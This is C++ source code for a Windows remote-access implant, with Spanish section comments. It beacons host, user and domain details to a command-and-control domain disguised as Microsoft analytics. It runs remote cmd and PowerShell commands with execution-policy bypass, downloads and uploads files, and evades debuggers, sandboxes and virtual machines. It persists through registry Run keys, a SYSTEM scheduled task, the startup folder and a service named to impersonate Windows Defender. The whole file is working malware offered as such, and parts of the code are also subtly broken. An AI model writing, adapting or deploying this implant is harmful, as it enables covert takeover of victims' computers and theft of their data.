#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <atomic>
#include <mutex>
#include <map>
#include <psapi.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <versionhelpers.h>
#include <winreg.h>
#include <dpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== CONFIGURACIÓN ====================
// NOTA: Estas configuraciones deberían venir cifradas o desde un servidor de configuración
#define C2_DOMAIN "cdn.microsoft-analytics.com"  // Dominio legítimo como cubierta
#define C2_PORT 443                             // HTTPS normal
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define BEACON_JITTER_MIN 30                    // Segundos mínimos entre beacons
#define BEACON_JITTER_MAX 120                   // Segundos máximos
#define MAX_RETRIES 3
#define FAILURE_TIMEOUT 300                     // Esperar 5 minutos si falla

// ==================== CLASE DE CIFRADO ====================
class CryptoHandler {
private:
    std::vector<BYTE> key;
    std::vector<BYTE> iv;
    
public:
    CryptoHandler() {
        // En un escenario real, esta clave vendría del C2 después del handshake
        std::string base_key = "DefaultStaticKeyForDemoOnlyChangeInProd";
        key.assign(base_key.begin(), base_key.end());
        key.resize(32); // AES-256
        
        iv.resize(16);
        BCryptGenRandom(NULL, iv.data(), 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    }
    
    std::string encrypt(const std::string& plaintext) {
        HCRYPTPROV hProv;
        HCRYPTKEY hKey;
        HCRYPTHASH hHash;
        
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
            return "";
        
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
            return "";
        
        if (!CryptHashData(hHash, key.data(), key.size(), 0))
            return "";
        
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
            return "";
        
        DWORD dwMode = CRYPT_MODE_CBC;
        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
        CryptSetKeyParam(hKey, KP_IV, iv.data(), 0);
        
        DWORD data_len = plaintext.size();
        DWORD buf_len = data_len + AES_BLOCK_SIZE;
        std::vector<BYTE> buffer(buf_len);
        memcpy(buffer.data(), plaintext.c_str(), data_len);
        
        if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &data_len, buf_len))
            return "";
        
        std::string result(buffer.begin(), buffer.begin() + data_len);
        
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        
        return base64_encode(result);
    }
    
    std::string decrypt(const std::string& ciphertext_b64) {
        std::string ciphertext = base64_decode(ciphertext_b64);
        if (ciphertext.empty()) return "";
        
        HCRYPTPROV hProv;
        HCRYPTKEY hKey;
        HCRYPTHASH hHash;
        
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
            return "";
        
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
            return "";
        
        if (!CryptHashData(hHash, key.data(), key.size(), 0))
            return "";
        
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
            return "";
        
        DWORD dwMode = CRYPT_MODE_CBC;
        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
        CryptSetKeyParam(hKey, KP_IV, iv.data(), 0);
        
        DWORD data_len = ciphertext.size();
        std::vector<BYTE> buffer(ciphertext.begin(), ciphertext.end());
        
        if (!CryptDecrypt(hKey, 0, TRUE, 0, buffer.data(), &data_len))
            return "";
        
        return std::string(buffer.begin(), buffer.begin() + data_len);
    }
    
private:
    std::string base64_encode(const std::string& input) {
        DWORD len = 0;
        CryptBinaryToStringA((BYTE*)input.data(), input.size(), 
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
        
        std::vector<char> buffer(len);
        CryptBinaryToStringA((BYTE*)input.data(), input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buffer.data(), &len);
        
        return std::string(buffer.data());
    }
    
    std::string base64_decode(const std::string& input) {
        DWORD len = 0;
        CryptStringToBinaryA(input.c_str(), input.size(),
                            CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
        
        std::vector<BYTE> buffer(len);
        CryptStringToBinaryA(input.c_str(), input.size(),
                            CRYPT_STRING_BASE64, buffer.data(), &len, NULL, NULL);
        
        return std::string(buffer.begin(), buffer.end());
    }
};

// ==================== DETECCIÓN DE AMBIENTE ====================
class EnvironmentChecker {
private:
    bool is_debugger_present;
    bool is_virtual_machine;
    bool is_sandbox;
    
public:
    EnvironmentChecker() {
        check_debugger();
        check_virtualization();
        check_sandbox();
    }
    
    bool is_safe() {
        // En un escenario real, aquí irían más comprobaciones
        return !is_debugger_present && !is_sandbox;
    }
    
    void evasive_sleep(DWORD milliseconds) {
        auto start = std::chrono::steady_clock::now();
        while (std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::steady_clock::now() - start).count() < milliseconds) {
            // Realizar trabajo útil para evitar sleep() fácilmente detectable
            volatile int dummy = 0;
            for (int i = 0; i < 1000; i++) {
                dummy += i * i;
            }
        }
    }
    
private:
    void check_debugger() {
        is_debugger_present = false;
        
        // Check 1: IsDebuggerPresent API
        if (IsDebuggerPresent()) {
            is_debugger_present = true;
            return;
        }
        
        // Check 2: Check remote debugger
        BOOL isRemotePresent;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemotePresent);
        if (isRemotePresent) {
            is_debugger_present = true;
            return;
        }
        
        // Check 3: NtGlobalFlag (simple check)
        PPEB pPeb = (PPEB)__readgsqword(0x60);
        if (pPeb->BeingDebugged) {
            is_debugger_present = true;
        }
    }
    
    void check_virtualization() {
        is_virtual_machine = false;
        
        // Check for common VM vendor strings
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buffer[256];
            DWORD bufferSize = sizeof(buffer);
            
            if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, 
                               (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
                std::string bios(buffer);
                std::transform(bios.begin(), bios.end(), bios.begin(), ::tolower);
                
                if (bios.find("vmware") != std::string::npos ||
                    bios.find("virtualbox") != std::string::npos ||
                    bios.find("vbox") != std::string::npos ||
                    bios.find("qemu") != std::string::npos) {
                    is_virtual_machine = true;
                }
            }
            RegCloseKey(hKey);
        }
    }
    
    void check_sandbox() {
        is_sandbox = false;
        
        // Check 1: Uptime (sandboxes often have short uptime)
        ULONGLONG uptime = GetTickCount64();
        if (uptime < 300000) { // Less than 5 minutes
            is_sandbox = true;
        }
        
        // Check 2: Memory size (sandboxes often have limited RAM)
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        
        if (memInfo.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) { // Less than 2GB
            is_sandbox = true;
        }
        
        // Check 3: CPU cores
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        if (sysInfo.dwNumberOfProcessors < 2) {
            is_sandbox = true;
        }
    }
};

// ==================== COMUNICACIÓN CON C2 ====================
class C2Communicator {
private:
    EnvironmentChecker env_checker;
    CryptoHandler crypto;
    std::string agent_id;
    std::atomic<int> retry_count;
    std::mutex comm_mutex;
    
    std::string generate_agent_id() {
        std::string machine_guid;
        HKEY hKey;
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "SOFTWARE\\Microsoft\\Cryptography", 
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char guid[64];
            DWORD size = sizeof(guid);
            
            if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, 
                               (LPBYTE)guid, &size) == ERROR_SUCCESS) {
                machine_guid = guid;
            }
            RegCloseKey(hKey);
        }
        
        // Si no podemos obtener el GUID, generamos uno
        if (machine_guid.empty()) {
            std::random_device rd;
            std::mt19937_64 gen(rd());
            std::uniform_int_distribution<uint64_t> dis;
            machine_guid = std::to_string(dis(gen));
        }
        
        return "WIN-" + machine_guid.substr(0, 12);
    }
    
    std::string gather_system_info() {
        std::stringstream info;
        
        // OS Version
        info << "OS:" << (IsWindows10OrGreater() ? "Win10+" : "Win<10") << ";";
        
        // Architecture
        SYSTEM_INFO sysInfo;
        GetNativeSystemInfo(&sysInfo);
        info << "Arch:" << (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") << ";";
        
        // Username
        char username[256];
        DWORD username_len = sizeof(username);
        GetUserNameA(username, &username_len);
        info << "User:" << username << ";";
        
        // Hostname
        char hostname[256];
        DWORD hostname_len = sizeof(hostname);
        GetComputerNameA(hostname, &hostname_len);
        info << "Host:" << hostname << ";";
        
        // Domain
        char domain[256];
        DWORD domain_len = sizeof(domain);
        GetComputerNameExA(ComputerNameDnsDomain, domain, &domain_len);
        if (domain_len > 0) {
            info << "Domain:" << domain << ";";
        }
        
        // Integrity level
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            DWORD elevation;
            DWORD size = sizeof(elevation);
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                                   sizeof(elevation), &size)) {
                info << "Elevated:" << (elevation ? "Yes" : "No") << ";";
            }
            CloseHandle(hToken);
        }
        
        return info.str();
    }
    
    std::string http_post(const std::string& data) {
        HINTERNET hInternet = InternetOpenA(USER_AGENT, 
                                          INTERNET_OPEN_TYPE_PRECONFIG, 
                                          NULL, NULL, 0);
        if (!hInternet) return "";
        
        HINTERNET hConnect = InternetConnectA(hInternet, C2_DOMAIN, C2_PORT,
                                            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return "";
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/collect",
                                            NULL, NULL, NULL,
                                            INTERNET_FLAG_SECURE | 
                                            INTERNET_FLAG_RELOAD |
                                            INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return "";
        }
        
        std::string encrypted_data = crypto.encrypt(data);
        std::string headers = "Content-Type: application/json\r\n";
        
        if (!HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                            (LPVOID)encrypted_data.c_str(), encrypted_data.length())) {
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return "";
        }
        
        // Read response
        std::string response;
        char buffer[4096];
        DWORD bytesRead = 0;
        
        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && 
               bytesRead > 0) {
            response.append(buffer, bytesRead);
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        if (!response.empty()) {
            return crypto.decrypt(response);
        }
        
        return "";
    }
    
    DWORD calculate_jitter() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<DWORD> dis(BEACON_JITTER_MIN * 1000, 
                                                BEACON_JITTER_MAX * 1000);
        return dis(gen);
    }
    
public:
    C2Communicator() : retry_count(0) {
        agent_id = generate_agent_id();
    }
    
    std::pair<bool, std::string> send_beacon() {
        std::lock_guard<std::mutex> lock(comm_mutex);
        
        if (!env_checker.is_safe()) {
            return {false, "Environment not safe"};
        }
        
        std::string beacon_data = "type=beacon&id=" + agent_id + 
                                 "&info=" + gather_system_info();
        
        try {
            std::string response = http_post(beacon_data);
            
            if (!response.empty()) {
                retry_count = 0;
                return {true, response};
            } else {
                retry_count++;
                return {false, "No response from C2"};
            }
        } catch (...) {
            retry_count++;
            return {false, "Exception during communication"};
        }
    }
    
    bool should_backoff() {
        return retry_count >= MAX_RETRIES;
    }
    
    DWORD get_backoff_time() {
        return FAILURE_TIMEOUT * 1000; // Convert to milliseconds
    }
    
    void reset_retries() {
        retry_count = 0;
    }
    
    std::string get_agent_id() const {
        return agent_id;
    }
};

// ==================== EJECUCIÓN DE COMANDOS ====================
class CommandExecutor {
private:
    std::string execute_cmd(const std::string& command) {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hStdoutRd, hStdoutWr;
        CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0);
        SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hStdoutWr;
        si.hStdOutput = hStdoutWr;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        ZeroMemory(&pi, sizeof(pi));
        
        std::string cmd = "cmd.exe /c " + command;
        
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, 
                          CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, 
                          NULL, NULL, &si, &pi)) {
            CloseHandle(hStdoutWr);
            
            // Wait for process to complete
            WaitForSingleObject(pi.hProcess, 10000); // 10 second timeout
            
            // Read output
            std::string output;
            DWORD dwRead;
            CHAR buffer[4096];
            
            while (ReadFile(hStdoutRd, buffer, sizeof(buffer), &dwRead, NULL) && dwRead > 0) {
                output.append(buffer, dwRead);
            }
            
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hStdoutRd);
            
            return output;
        }
        
        CloseHandle(hStdoutRd);
        CloseHandle(hStdoutWr);
        return "Error executing command";
    }
    
    std::string execute_powershell(const std::string& script) {
        std::string command = "powershell -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -Command \"" + 
                              script + "\"";
        return execute_cmd(command);
    }
    
    bool download_file(const std::string& url, const std::string& path) {
        return URLDownloadToFileA(NULL, url.c_str(), path.c_str(), 0, NULL) == S_OK;
    }
    
    std::string upload_file(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return "";
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        return content;
    }
    
public:
    std::string execute(const std::string& command_type, const std::string& args) {
        if (command_type == "cmd") {
            return execute_cmd(args);
        } else if (command_type == "powershell") {
            return execute_powershell(args);
        } else if (command_type == "download") {
            size_t space_pos = args.find(' ');
            std::string url = args.substr(0, space_pos);
            std::string path = args.substr(space_pos + 1);
            
            return download_file(url, path) ? "Download successful" : "Download failed";
        } else if (command_type == "upload") {
            return upload_file(args);
        } else if (command_type == "sleep") {
            DWORD seconds = std::stoul(args);
            Sleep(seconds * 1000);
            return "Slept for " + args + " seconds";
        } else if (command_type == "kill") {
            exit(0);
            return "";
        }
        
        return "Unknown command type";
    }
};

// ==================== PERSISTENCIA AVANZADA ====================
class PersistenceManager {
private:
    std::string get_current_path() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }
    
    bool install_registry_persistence() {
        std::string exe_path = get_current_path();
        
        // Multiple registry locations for redundancy
        std::vector<std::pair<HKEY, std::string>> locations = {
            {HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"},
            {HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"}
        };
        
        bool success = false;
        for (const auto& [hive, key_path] : locations) {
            HKEY hKey;
            if (RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                const char* value_name = "WindowsDefenderUpdate";
                RegSetValueExA(hKey, value_name, 0, REG_SZ, 
                             (const BYTE*)exe_path.c_str(), exe_path.length() + 1);
                RegCloseKey(hKey);
                success = true;
            }
        }
        
        return success;
    }
    
    bool install_scheduled_task() {
        std::string exe_path = get_current_path();
        std::string cmd = "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" "
                         "/tr \"" + exe_path + "\" /sc daily /st 09:00 "
                         "/ru SYSTEM /f /rl highest";
        
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        
        return CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    
    bool install_startup_folder() {
        char startup_path[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
            return false;
        }
        
        std::string dest_path = std::string(startup_path) + "\\WindowsUpdate.exe";
        std::string src_path = get_current_path();
        
        return CopyFileA(src_path.c_str(), dest_path.c_str(), FALSE);
    }
    
    bool install_service() {
        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (!scm) return false;
        
        std::string exe_path = get_current_path();
        SC_HANDLE service = CreateServiceA(
            scm, "WinDefendUpdate", "Windows Defender Update Service",
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
            exe_path.c_str(), NULL, NULL, NULL, NULL, NULL);
        
        if (service) {
            CloseServiceHandle(service);
            CloseServiceHandle(scm);
            return true;
        }
        
        CloseServiceHandle(scm);
        return false;
    }
    
public:
    bool establish_persistence() {
        // Try multiple methods
        bool success = false;
        
        success |= install_registry_persistence();
        success |= install_scheduled_task();
        success |= install_startup_folder();
        
        // Only try service if we have admin rights
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD size = sizeof(elevation);
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                                   sizeof(elevation), &size)) {
                if (elevation.TokenIsElevated) {
                    success |= install_service();
                }
            }
            CloseHandle(hToken);
        }
        
        return success;
    }
};

// ==================== AGENTE PRINCIPAL ====================
class AdvancedAgent {
private:
    C2Communicator comm;
    CommandExecutor executor;
    PersistenceManager persistence;
    EnvironmentChecker env_checker;
    std::atomic<bool> running;
    std::thread beacon_thread;
    std::mutex task_mutex;
    std::vector<std::string> task_queue;
    
    void beacon_loop() {
        while (running) {
            try {
                auto [success, response] = comm.send_beacon();
                
                if (success && !response.empty()) {
                    process_response(response);
                } else if (comm.should_backoff()) {
                    env_checker.evasive_sleep(comm.get_backoff_time());
                    comm.reset_retries();
                }
                
                DWORD jitter = comm.calculate_jitter();
                env_checker.evasive_sleep(jitter);
                
            } catch (...) {
                // Silently handle exceptions
                env_checker.evasive_sleep(60000); // Wait 1 minute on error
            }
        }
    }
    
    void process_response(const std::string& response) {
        // Parse JSON-like response (simplified)
        // Format: {"tasks":[{"type":"cmd","args":"whoami"},...]}
        
        // Simple task extraction (in real scenario, parse JSON properly)
        if (response.find("tasks") != std::string::npos) {
            // Extract and queue tasks
            std::lock_guard<std::mutex> lock(task_mutex);
            
            // Simplified: Assume response is directly executable
            if (response.find("sleep") != std::string::npos) {
                executor.execute("sleep", "30");
            } else if (response.find("persist") != std::string::npos) {
                persistence.establish_persistence();
            } else {
                // Default to cmd execution
                executor.execute("cmd", response);
            }
        }
    }
    
    bool check_single_instance() {
        // Create a mutex with a unique name based on agent ID
        std::string mutex_name = "Global\\" + comm.get_agent_id();
        HANDLE mutex = CreateMutexA(NULL, TRUE, mutex_name.c_str());
        
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(mutex);
            return false;
        }
        
        return true;
    }
    
public:
    AdvancedAgent() : running(false) {
        if (!check_single_instance()) {
            exit(0);
        }
        
        if (!env_checker.is_safe()) {
            // In stealth mode, just exit silently
            exit(0);
        }
    }
    
    ~AdvancedAgent() {
        stop();
    }
    
    void start() {
        running = true;
        
        // Establish persistence on first run
        static bool first_run = true;
        if (first_run) {
            persistence.establish_persistence();
            first_run = false;
        }
        
        // Start beacon thread
        beacon_thread = std::thread(&AdvancedAgent::beacon_loop, this);
    }
    
    void stop() {
        running = false;
        if (beacon_thread.joinable()) {
            beacon_thread.join();
        }
    }
    
    void run() {
        start();
        
        // Keep main thread alive
        while (running) {
            Sleep(10000); // Check every 10 seconds
        }
    }
};

// ==================== ENTRY POINT ====================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // Hide console if compiled as GUI app
    #ifndef _DEBUG
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
    #endif
    
    // Check command line arguments
    bool debug_mode = false;
    if (__argc > 1) {
        std::string arg = __argv[1];
        if (arg == "--debug") {
            debug_mode = true;
            AllocConsole();
            freopen("CONOUT$", "w", stdout);
        }
    }
    
    try {
        AdvancedAgent agent;
        agent.run();
    } catch (...) {
        // Silent fail
        return 1;
    }
    
    return 0;
}
